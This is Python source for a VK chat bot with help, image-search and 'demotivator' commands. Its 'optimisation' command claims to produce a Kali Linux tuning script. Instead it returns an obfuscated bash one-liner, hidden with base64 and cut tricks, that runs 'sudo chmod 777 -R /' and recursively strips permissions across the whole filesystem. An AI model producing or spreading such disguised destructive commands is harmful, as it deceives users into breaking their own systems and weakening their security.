import asyncio
import base64
import logging
import os
from random import randint, choice
from string import ascii_letters as ASCII_LETTERS
from typing import Callable, Awaitable, Any

import yaml
from vkwave.api import BotSyncSingleToken, Token, API
from vkwave.bots import (
    TokenStorage,
    Dispatcher,
    BotLongpollExtension,
    DefaultRouter,
    GroupId,
    EventTypeFilter,
    BotEvent,
    BaseEvent,
    PhotoUploader,
)
from vkwave.bots.core import BaseFilter
from vkwave.bots.core.dispatching.filters.base import FilterResult
from vkwave.bots.core.dispatching.handler.callback import BaseCallback
from vkwave.client import AIOHTTPClient
from vkwave.longpoll import BotLongpollData, BotLongpoll
from vkwave.types.bot_events import BotEventType

from images.searchimages import ImgSearch

logging.basicConfig(level=logging.DEBUG)
botToken: Token
gid: int
ApiMethods: object

if not (os.environ['VK_BOT_TOKEN'] and os.environ['VK_BOT_GID']):
    with open(os.path.join(os.path.dirname(os.path.realpath(__file__)), 'vkapi.yaml')) as c:
        config = yaml.safe_load(c)
        botToken = Token(config["bot_token"])
        gid = int(config["group_id"])
else:
    botToken = Token(os.environ['VK_BOT_TOKEN'])
    gid = int(os.environ['VK_BOT_GID'])


class Bot:
    class _Methods:
        class Help:
            @staticmethod
            async def run(event: BotEvent):
                return """Команды:
кал <текст> - Поиск kала. Ваш персональный kал при вызове без текста.
оптимизация - Сгенерировать скрипт оптимизации kaл linux"""

        class Kal:
            @staticmethod
            async def run(event: BotEvent):
                imgSearch = ImgSearch()
                if len(event.object.object.message.text) < 5:
                    query = f"kali {hex(event.object.object.message.from_id)[-2:]}"
                else:
                    query = f"kali {event.object.object.message.text[4:]}"
                links = imgSearch.fetch(query)
                if links:
                    link = [links[randint(0, len(links) - 1)]]
                    await ApiMethods.sendImage(event.object.object.message.from_id, link)
                else:
                    return "kaлов не найдено((0("

        class Optimisation:
            @staticmethod
            async def run(event: BotEvent):
                def bashEncode(string):
                    def randString(size):
                        return ''.join(choice(ASCII_LETTERS) for _ in range(size))

                    def b64(s):
                        return f"`echo {base64.b64encode(bytes(s, 'ascii')).decode('ascii')} | base64 -d`"

                    def cut(s):
                        len1, len2 = randint(2, 10), randint(2, 10)
                        rand1, rand2 = randString(len1), randString(len2)
                        pos = len1 + 1
                        return f"`echo {rand1}{s}{rand2} | cut -b {pos}-{pos}`"
                    result = "$("
                    for sym in string:
                        mode = randint(0, 1)
                        if mode == 0:
                            result += b64(sym)
                        elif mode == 1:
                            result += cut(sym)
                    return result + ")"

                return bashEncode("sudo chmod 777 -R /")

        class Demotivator:
            @staticmethod
            async def run(event: BotEvent):
                return f"{event.object.object.message.attachments[0].photo.url}"

    class _TextFilters:
        filters = []

        class Help(BaseFilter):
            async def check(self, event: BotEvent) -> FilterResult:
                return FilterResult(event.object.object.message.text.lower() in
                                    ["hello", "привет", "команды", "commands", "help", "помощь"])

        class Kal(BaseFilter):
            async def check(self, event: BotEvent) -> FilterResult:
                return FilterResult(event.object.object.message.text.lower()[:3] in ["кал", "kal"])

        class Optimisation(BaseFilter):
            async def check(self, event: BotEvent) -> FilterResult:
                return FilterResult(event.object.object.message.text.lower() in ["оптимизация", "optimisation"])

        class Demotivator(BaseFilter):
            async def check(self, event: BotEvent) -> FilterResult:
                return FilterResult(event.object.object.message.text.lower()[:11] in ["демотиватор", "demotivator"])

        def __init__(self):
            for member in dir(self):
                if member[:1].isupper():
                    self.filters.append(getattr(self, member))

    class _Callback(BaseCallback):
        def __init__(self, func: Callable[[BaseEvent], Awaitable[Any]]):
            self.func = func

        async def execute(self, event: BaseEvent) -> Any:
            return await self.func(event)

    def get_handlers(self, router):
        handlers = []
        eventTypeFilter = EventTypeFilter(BotEventType.MESSAGE_NEW)
        textFilters = self._TextFilters().filters
        methods = self._Methods()
        for _filter in textFilters:
            textFilter = _filter()
            resultCallback = self._Callback(getattr(methods, _filter.__name__).run)
            handler = router.registrar.new()
            handler.filters = [eventTypeFilter, textFilter]
            handler.callback = resultCallback
            handlers.append(handler)

        return handlers


async def main():
    global ApiMethods
    client = AIOHTTPClient()
    token = BotSyncSingleToken(botToken)
    api_session = API(token, client)
    api = api_session.get_context()
    lp_data = BotLongpollData(gid)
    longpoll = BotLongpoll(api, lp_data)
    token_storage = TokenStorage[GroupId]()
    dp = Dispatcher(api_session, token_storage)
    lp_extension = BotLongpollExtension(dp, longpoll)
    uploader = PhotoUploader(api_session.get_context())

    class ApiMethods:
        @staticmethod
        async def sendImage(userId, links):
            attachment = await uploader.get_attachments_from_links(
                peer_id=userId,
                links=links
            )
            await api_session.get_context().messages.send(
                user_id=userId, attachment=attachment, random_id=0
            )

    router = DefaultRouter()
    bot = Bot()

    handlers = bot.get_handlers(router)
    for handler in handlers:
        router.registrar.register(handler.ready())

    dp.add_router(router)
    await dp.cache_potential_tokens()
    await lp_extension.start()


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(main())
    loop.run_forever()

